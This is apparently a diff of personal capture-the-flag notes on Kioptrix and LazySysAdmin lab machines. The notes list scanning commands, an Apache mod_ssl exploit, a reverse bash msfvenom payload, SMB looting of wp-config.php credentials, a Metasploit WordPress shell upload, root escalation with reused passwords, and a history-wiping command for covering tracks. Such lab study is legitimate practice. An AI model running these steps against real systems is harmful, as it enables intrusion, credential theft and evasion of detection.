@@ -1,9 +1,14 @@
 KIOPTRIX 1
+LEVEL: EASY
+
 
 1 -  netdiscover -r 192.168.1.0/24
+
+
 --->  nmap -O 192.168.1.8  ----->  OS CPE: cpe:/o:linux:linux_kernel:2.4
 OS details: Linux 2.4.9 
 
+-> nmap -T4 -Pn -sS -p- -A  192.168.1.8
 
 2 -  ./OpenFuck | grep 1.3.20
 	./OpenFuck 0x6b 192.168.1.8 443 -c 40
@@ -38,6 +43,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Co
 #################################################################################################################################
 
 KIOPTRIX 3
+LEVEL: EASY
 
 1 - port 80
 in login page we have been found web frame work: LotusCMS
@@ -65,6 +71,7 @@ which ht
 ##################################################################################################################################
 
 KIOPTRIX 5
+LEVEL: EASY
 
 1 - 80,8080 
 searchsploit pChart
@@ -124,6 +131,7 @@ root
 ############################################################################################################################
 
 KIOPTRIX 4
+LEVEL: EASY
 
 1- 
 use auxiliary/scanner/smb/smb_enumusers
@@ -158,13 +166,71 @@ NUll
 
 ##############################################################################################################################################
 
+LAZYSYSADMIN
+
+LEVEL: EASY
 
 
+1 - # nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.1.15
+
+    # dirb http://192.168.1.15 -r
+    ==> DIRECTORY: http://192.168.1.15/wordpress/ 
+
+2 - smbclient -L \\192.168.1.15\\
+
+3 - smbclient \\\\192.168.1.15\\share$
+
+4 - inside smb basic shell:
+    >ls
+    >get todolist.txt
+    >get deets.txt
+    >cd wordpress/
+    >get wp-config.php
+
+5 -
+vim wp-config.php
+
+/** MySQL database username */
+define('DB_USER', 'Admin');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'TogieMYSQL12345^^');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+ 
+
+vim deets.txt 
+
+BF Remembering all these passwords.
+
+Remember to remove this file and update your password after we push out the server.
+
+Password 12345
 
 
+6 - use exploit/unix/webapp/wp_admin_shell_upload
 
+meterpreter> shell
 
+python -c 'import pty;pty.spawn("/bin/bash")'
 
+$ id
+
+$ su togie
+Password: 12345
+
+$  sudo su -
+Password: 12345
+
+root@LazySysAdmin:~# cat proof.txt
+
+optional:
+
+root@LazySysAdmin:~# cat /dev/null > ~/.bash_history && history -c && exit     
+(history cleared completely)
+
+####################################################################################################################################################
 
 
 
